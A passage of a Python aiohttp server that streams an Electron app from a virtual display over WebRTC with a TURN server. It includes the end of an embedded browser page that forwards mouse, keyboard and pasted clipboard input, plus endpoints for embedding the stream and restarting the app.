                const scaleX = {DISPLAY_WIDTH} / rect.width;
                const scaleY = {DISPLAY_HEIGHT} / rect.height;
                const x = Math.round((e.clientX - rect.left) * scaleX);
                const y = Math.round((e.clientY - rect.top) * scaleY);
                const button = e.button + 1;
                sendInput({{ type: eventName, x, y, button }});
            }});
        }});

        document.addEventListener('keydown', async (e) => {{
            if (!dc || dc.readyState !== 'open') return;
            e.preventDefault();

            if (e.key.toLowerCase() === 'v' && (e.ctrlKey || e.metaKey)) {{
                try {{
                    const clipboardText = await navigator.clipboard.readText();
                    sendInput({{
                        type: 'keydown',
                        key: e.key,
                        ctrlKey: e.ctrlKey,
                        metaKey: e.metaKey,
                        clipboardText: clipboardText
                    }});
                    return;
                }} catch (err) {{
                    console.warn('Clipboard access failed:', err);
                }}
            }}

            let keyName = e.key;
            if (e.key === 'Backspace') keyName = 'BackSpace';
            else if (e.key === 'Enter') keyName = 'Return';
            else if (e.key === ' ') keyName = 'space';
            else if (e.key === 'Tab') keyName = 'Tab';
            else if (e.key === 'Escape') keyName = 'Escape';
            else if (e.key === 'ArrowUp') keyName = 'Up';
            else if (e.key === 'ArrowDown') keyName = 'Down';
            else if (e.key === 'ArrowLeft') keyName = 'Left';
            else if (e.key === 'ArrowRight') keyName = 'Right';
            else if (e.key === 'Delete') keyName = 'Delete';
            else if (e.key === 'Insert') keyName = 'Insert';
            else if (e.key === 'Home') keyName = 'Home';
            else if (e.key === 'End') keyName = 'End';
            else if (e.key === 'PageUp') keyName = 'Page_Up';
            else if (e.key === 'PageDown') keyName = 'Page_Down';

            sendInput({{
                type: 'keydown',
                key: keyName,
                ctrlKey: e.ctrlKey,
                metaKey: e.metaKey
            }});
        }});

        remoteVideo.addEventListener('contextmenu', (e) => e.preventDefault());

        window.addEventListener('load', () => {{
            connect();
        }});
    </script>
</body>
</html>"""
    
    # Replace placeholders with actual values
    html = html.replace('__STUN_URL_0__', STUN_URLS[0])
    html = html.replace('__STUN_URL_1__', STUN_URLS[1])
    html = html.replace('__TURN_URLS__', json.dumps(TURN_URLS))

    response = web.Response(text=html, content_type="text/html")
    response.headers['X-Frame-Options'] = 'ALLOWALL'
    response.headers['Content-Security-Policy'] = "frame-ancestors *"
    return response

async def restart_electron(request):
    """Restart Electron app for fresh session"""
    print("\n" + "="*30)
    print("🔄 RECEIVED REQUEST TO RESTART ELECTRON")
    print("="*30)

    try:
        # Stop current Electron
        stop_electron()

        # Clear session data
        clear_electron_session()

        # Start fresh Electron
        start_electron()

        # Restart monitoring
        global electron_monitor_thread
        if electron_monitor_thread and electron_monitor_thread.is_alive():
            print("  - ⚠️  Old monitor thread still alive before restart. Joining...")
            electron_monitor_thread.join(timeout=2)
            
        print("👀 Starting new Electron output monitor thread...")
        electron_monitor_thread = threading.Thread(target=monitor_electron_output, daemon=True)
        electron_monitor_thread.start()
        print("  - ✅ New monitor thread started.")

        print("✅ ELECTRON RESTART SEQUENCE COMPLETE")
        return web.Response(text="✅ Electron restarted with fresh session", status=200)

    except Exception as e:
        print(f"❌ FAILED TO RESTART ELECTRON: {e}")
        import traceback
        traceback.print_exc()
        return web.Response(text=f"❌ Failed to restart: {e}", status=500)

async def on_shutdown(app):
    print("🧹 Shutting down...")

    # Close all peer connections
    coros = [pc.close() for pc in pcs]
    await asyncio.gather(*coros)
    pcs.clear()

    # Terminate processes
    if turn_process:
        turn_process.terminate()
        turn_process.wait()
    if xvfb_process:
        xvfb_process.terminate()
        xvfb_process.wait()
    if electron_process:
        electron_process.terminate()
        electron_process.wait()

def main():
    global electron_monitor_thread

    # Start TURN server first
    start_turn()

    # Start Xvfb and Electron before starting the web server
    start_xvfb()
    start_electron()

    # Start monitoring Electron output
    electron_monitor_thread = threading.Thread(target=monitor_electron_output, daemon=True)
    electron_monitor_thread.start()

    # Set up aiohttp application
    app = web.Application()
    app.router.add_get('/', index)
    app.router.add_get('/embed', embed)
    app.router.add_post('/offer', offer)
    app.router.add_post('/restart-electron', restart_electron)
    app.on_shutdown.append(on_shutdown)

    print("\n" + "="*60)
    print("WebRTC Electron Streaming Server with TURN")
    print("="*60)
    print(f"Server running at http://0.0.0.0:8080")
    print(f"TURN server URLs: {', '.join(TURN_URLS)}")
    print(f"Display: {DISPLAY_NUM}")
    print(f"Resolution: {DISPLAY_WIDTH}x{DISPLAY_HEIGHT}")
    print("="*60 + "\n")

    web.run_app(app, host='0.0.0.0', port=8080)

if __name__ == '__main__':
    main()
